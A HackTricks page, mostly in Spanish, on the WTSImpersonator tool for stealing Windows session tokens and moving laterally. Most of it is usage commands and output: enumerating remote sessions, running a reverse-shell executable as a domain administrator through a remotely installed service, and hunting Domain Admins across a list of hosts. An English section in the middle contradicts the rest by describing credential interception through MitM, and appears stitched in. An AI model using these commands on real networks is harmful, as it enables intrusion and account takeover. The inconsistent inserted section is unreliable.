<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

WTS Impersonator abusa del Named pipe RPC "**\\pipe\LSM_API_service**" para enumerar usuarios conectados y robar tokens de otros usuarios sin utilizar la técnica normal de "Impersonación de token", esto permite un movimiento lateral fácil y sigiloso, esta técnica fue investigada y desarrollada por [Omri Baso](https://www.linkedin.com/in/omri-baso/).

La herramienta `WTSImpersonator` se puede encontrar en [github](https://github.com/OmriBaso/WTSImpersonator).
```
WTSEnumerateSessionsA → WTSQuerySessionInformationA -> WTSQueryUserToken -> CreateProcessAsUserW
```
#### Módulo `enum`:

Enumerar los usuarios locales en la máquina desde la que se está ejecutando la herramienta.
```powershell
.\WTSImpersonator.exe -m enum
```
Enumerar una máquina de forma remota dado una dirección IP o un nombre de host.
```powershell  
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```
#### Módulo `exec` / `exec-remote`:
Tanto "exec" como "exec-remote" requieren estar en un contexto de **"Servicio"**.
El módulo local "exec" no necesita nada más que el archivo WTSImpersonator.exe y el binario que deseas ejecutar \(-c flag\), esto podría ser
un "C:\\Windows\\System32\\cmd.exe" normal y abrirás un CMD como el usuario que desees, un ejemplo sería:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
Puedes utilizar PsExec64.exe para obtener un contexto de servicio.
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```
Para `exec-remote`, las cosas son un poco diferentes. He creado un servicio que se puede instalar de forma remota, al igual que `PsExec.exe`. El servicio recibirá un `SessionId` y un `binario para ejecutar` como argumento, y se instalará y ejecutará de forma remota siempre que se le otorguen los permisos adecuados. Un ejemplo de ejecución se vería de la siguiente manera:
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m enum -s 192.168.40.129

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso
WTSEnumerateSessions count: 1
[2] SessionId: 2 State: WTSDisconnected (4) WinstationName: ''
WTSUserName:  Administrator
WTSDomainName: LABS
WTSConnectState: 4 (WTSDisconnected)
```
Como se puede ver arriba, el `Sessionid` de la cuenta de Administrador es `2`, por lo que lo utilizamos a continuación en la variable `id` al ejecutar código de forma remota.
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```
#### Módulo `user-hunter`:

El módulo de caza de usuarios te dará la capacidad de enumerar múltiples máquinas y, si se encuentra un usuario específico, ejecutará código en nombre de ese usuario.
Esto es útil cuando se busca a los "Administradores de Dominio" mientras se tienen derechos de administrador local en algunas máquinas.
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
# WTS Impersonator

The WTS Impersonator technique allows an attacker to steal user credentials by impersonating a Windows Terminal Server (WTS) session.

## Description

When a user logs into a Windows Terminal Server, a session is created for that user. This session is managed by the Windows Terminal Services (WTS) service. The WTS Impersonator technique takes advantage of the fact that the WTS service uses the user's credentials to authenticate and authorize actions within the session.

By impersonating a WTS session, an attacker can intercept and steal the user's credentials as they are passed to the WTS service for authentication. This can be done by injecting malicious code into the WTS service or by using a Man-in-the-Middle (MitM) attack to intercept the credentials in transit.

Once the attacker has obtained the user's credentials, they can use them to gain unauthorized access to the user's account or to perform other malicious activities.

## Mitigation

To mitigate the risk of WTS Impersonator attacks, it is recommended to:

1. Implement strong authentication mechanisms, such as multi-factor authentication, to make it harder for attackers to steal user credentials.
2. Regularly update and patch the Windows Terminal Server and associated software to protect against known vulnerabilities.
3. Monitor network traffic for signs of suspicious activity, such as unauthorized access attempts or unusual data transfers.
4. Educate users about the risks of phishing attacks and other social engineering techniques that can be used to steal credentials.

By following these mitigation measures, organizations can reduce the likelihood of falling victim to WTS Impersonator attacks and protect their users' credentials from being stolen.
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m user-hunter -uh LABS/Administrator -ipl .\test.txt -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso

[+] Hunting for: LABS/Administrator On list: .\test.txt
[-] Trying: 192.168.40.131
[+] Opned WTS Handle: 192.168.40.131
[-] Trying: 192.168.40.129
[+] Opned WTS Handle: 192.168.40.129

----------------------------------------
[+] Found User: LABS/Administrator On Server: 192.168.40.129
[+] Getting Code Execution as: LABS/Administrator
[+] Trying to execute remotly
[+] Transfering file remotely from: .\WTSService.exe To: \\192.168.40.129\admin$\voli.exe
[+] Transfering file remotely from: .\SimpleReverseShellExample.exe To: \\192.168.40.129\admin$\DrkSIM.exe
[+] Successfully transfered file!
[+] Successfully transfered file!
[+] Sucessfully Transferred Both Files
[+] Will Create Service voli
[+] Create Service Success : "C:\Windows\voli.exe" 2 C:\Windows\DrkSIM.exe
[+] OpenService Success!
[+] Started Sevice Sucessfully!

[+] Deleted Service
```

